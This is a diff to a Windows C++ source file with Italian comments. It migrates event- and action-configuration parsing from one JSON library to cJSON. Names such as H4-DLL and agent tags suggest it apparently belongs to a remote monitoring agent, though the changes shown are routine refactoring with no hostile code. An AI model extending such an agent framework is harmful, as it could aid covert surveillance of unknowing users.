@@ -1,7 +1,7 @@
 #include <mutex>
 #include <windows.h>
-#include <json/JSON.h>
 #include <listentry.h>
+#include <cJSON/cJSON.h>
 #include "common.h"
 #include "bss.h"
 #include "H4-DLL.h"
@@ -25,16 +25,16 @@
 #define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
 #define SYNCM_SLEEPTIME 100
 
-typedef void (WINAPI *EventMonitorAdd_t) (JSONObject, EVENT_PARAM *, DWORD);
+typedef void (WINAPI *EventMonitorAdd_t) (cJSON*, EVENT_PARAM *, DWORD);
 typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
 typedef BOOL (WINAPI *ActionFunc_t) (BYTE *);
 
 ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 
-typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
-extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
-extern BOOL HM_CountConfSection(char *conf, WCHAR *section, DWORD *count);
+typedef void (WINAPI *conf_callback_t)(cJSON *, DWORD counter);
+extern BOOL HM_ParseConfSection(char *conf, CHAR *section, conf_callback_t call_back);
+extern BOOL HM_CountConfSection(char *conf, CHAR *section, DWORD *count);
 extern DWORD AM_GetAgentTag(const WCHAR *agent_name);
 
 // Gestione event monitor  ----------------------------------------------
@@ -173,7 +173,7 @@ void SM_EventTableState(DWORD event_id, BOOL state)
 }
 
 // Assegna una riga "evento" della configurazione al corretto event monitor
-void EventMonitorAddLine(const WCHAR *event_type, JSONObject conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
+void EventMonitorAddLine(const WCHAR *event_type, cJSON* conf_json, EVENT_PARAM *event_param, DWORD event_id, BOOL event_state)
 {
 	DWORD i;
 	// Inizializza lo stato attivo/disattivo dell'evento
@@ -436,7 +436,7 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 }
 
 //-----------------------------------------------------------------------------------
-void WINAPI ParseEvents(JSONObject conf_json, DWORD counter)
+void WINAPI ParseEvents(cJSON *conf_json, DWORD counter)
 {
 	EVENT_PARAM event_param;
 
@@ -582,12 +582,12 @@ void UpdateEventConf()
 
 	// Legge gli eventi
 	EventTableInit();
-	HM_ParseConfSection(conf_memory, L"events", &ParseEvents);
+	HM_ParseConfSection(conf_memory, "events", &ParseEvents);
 
 	// Legge le azioni
-	HM_CountConfSection(conf_memory, L"actions", &action_count);
+	HM_CountConfSection(conf_memory, "actions", &action_count);
 	ActionTableInit(action_count);
-	HM_ParseConfSection(conf_memory, L"actions", &ParseActions);
+	HM_ParseConfSection(conf_memory, "actions", &ParseActions);
 
 	SAFE_FREE(conf_memory);
 }
